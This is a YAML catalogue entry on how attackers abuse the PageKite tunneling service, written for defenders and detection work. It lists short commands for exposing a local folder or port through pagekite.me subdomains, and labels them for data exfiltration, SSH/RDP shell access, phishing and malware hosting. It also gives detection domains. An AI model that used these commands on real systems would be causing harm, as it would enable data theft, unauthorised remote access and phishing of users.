---
Name: PageKite
Description: PageKite is a fast, reliable localhost tunneling solution which is paid but allows a free version for 1 month. This can be abused by the threat actors as well as insiders to expose local apps, services over the internet as well as to download malicious binaries, host malware and to host phishing sites to target users.
Author: Kamran Saifullah
Created: 2024-10-14
Commands:

  - Command: curl -O https://pagekite.net/pk/pagekite.py
    Description: PageKite allows to download a python program which can be called directly from the URL and can be executed on the local machine.
    Usecase: Downloading and execution of pagekite python program.
    Category: install
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: pagekite.py <LOCAL PATH> <SUBDOMAIN>.pagekite.me
    Description: Exposing local file system over the internet for data exfiltration.
    Usecase: Hosting local file system and binding them to the PageKite domains for data exfiltration.
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: pagekite.py <PORT> <SUBDOMAIN>.pagekite.me
    Description: Exposing local services over the internet for external access.
    Usecase: Hosting local services and binding them to the PageKite domains for external access.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: pagekite.py <PORT> <SUBDOMAIN>.pagekite.me
    Description: Exposing local ssh/rdp over PageKite domains for shell-access.
    Usecase: Hosting local services i.e. SSH/RDP etc. for shell access.
    Category: shell-access
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: pagekite.py <PORT> <SUBDOMAIN>.pagekite.me
    Description: Hosting phishing pages locally and exposing them via PageKite subdomains to target users. 
    Usecase: Hosting phishing pages locally by threat actors and using the PageKite domains to target the users.
    Category: phishing
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: pagekite.py <LOCAL PATH> <SUBDOMAIN>.pagekite.me
    Description: Hosting malicious files/confidential files via a local path and exposing them over PageKite domains for download.
    Usecase: Hosting local files, malicious files, sensitive files and exposing them over PageKite domains for downloads.
    Category: download
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

Full_Path:
  - Path: Downloaded version of PakeKite python program, which gets executed anywhere on the system.
Detection:
  - Domain: '*.pagekite.net'
  - Domain: '*.pagekite.me'
Resources:
  - Link: https://pagekite.net/
Acknowledgement:
  - Person: Kamran Saifullah
    Handle: '@deFr0ggy'
---
